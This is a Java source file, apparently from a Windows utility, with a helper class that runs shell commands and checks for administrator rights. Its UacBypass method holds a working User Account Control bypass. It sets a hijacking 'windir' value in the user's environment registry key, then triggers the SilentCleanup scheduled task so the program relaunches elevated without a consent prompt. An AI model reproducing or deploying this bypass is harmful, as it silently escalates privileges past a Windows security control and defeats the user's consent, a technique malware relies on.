package com.czr.tools;

import com.czr.entity.CommandResult;

import java.io.File;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class Command {
    public static final boolean isAdmin = checkAdminPerm();

    public static boolean checkAdminPerm() {
        String SystemDrive = System.getenv("SystemDrive");
        List<String> cmdline = new ArrayList<String>() {{
            add("fsutil");
            add("dirty");
            add("query");
            add(SystemDrive);
        }};
        CommandResult result = run(cmdline, false);
        return result.getReturnCode() == 0;
    }


    public static void restartWithAdmin(List<String> args) {
        if (isAdmin) return;

        try {
            File self = new File(Command.class.getProtectionDomain().getCodeSource().getLocation().toURI());
//            List<String> cmdline = new ArrayList<String>() {{
//                add("java");
//                add("-jar");
//                add(self.getAbsolutePath());
//                addAll(args);
//            }};
                UacBypass(String.format("java -jar \"%s\" %s", self.getAbsolutePath(), args));
//            run(cmdline, true);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.exit(0);
    }

    public static void UacBypass(String cmdline) {
        run(Arrays.asList("reg add hkcu\\Environment /v windir /d \"cmd /c reg delete hkcu\\Environment /v windir /f & start \\\"\\\" " + cmdline +"||\" /f"), false);
        run(Arrays.asList("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), false);
    }

    public static CommandResult run(List<String> cmdline, boolean runAsAdmin) {
        if (cmdline.size() == 0) return CommandResult.empty;

        String command;
        StringBuilder stdout = new StringBuilder();
        StringBuilder stderr = new StringBuilder();
        int returnCode = -1;

        if (!isAdmin && runAsAdmin) {
            String program = cmdline.get(0);
            String args = String.join(" ", cmdline.subList(1, cmdline.size()));
            command = String.format(
                    "mshta VBScript:CreateObject(\"shell.application\").ShellExecute(\"%s\",\"%s\",\"\",\"runas\",1)(Close)",
                    program.replace("\"", "\"\""),
                    args.replace("\"", "\"\"")
            );
        } else {
            command = String.join(" ", cmdline);
        }

        try {
            Runtime run = Runtime.getRuntime();
            Process process = run.exec(command);
            // 自动关闭流
            try (InputStream inStream = process.getInputStream(); InputStream errStream = process.getErrorStream()) {
                byte[] buffer = new byte[8192];
                for (int n; (n = inStream.read(buffer)) != -1; ) {
                    stdout.append(new String(buffer, 0, n));
                }
                for (int n; (n = errStream.read(buffer)) != -1; ) {
                    stderr.append(new String(buffer, 0, n));
                }
            }
            returnCode = process.waitFor();
            process.destroy();
        } catch (Exception e) {
            e.printStackTrace();
        }

        CommandResult result = new CommandResult(
                cmdline,
                isAdmin || runAsAdmin,
                returnCode,
                stdout.toString(),
                stderr.toString()
        );

        return result;
    }
}
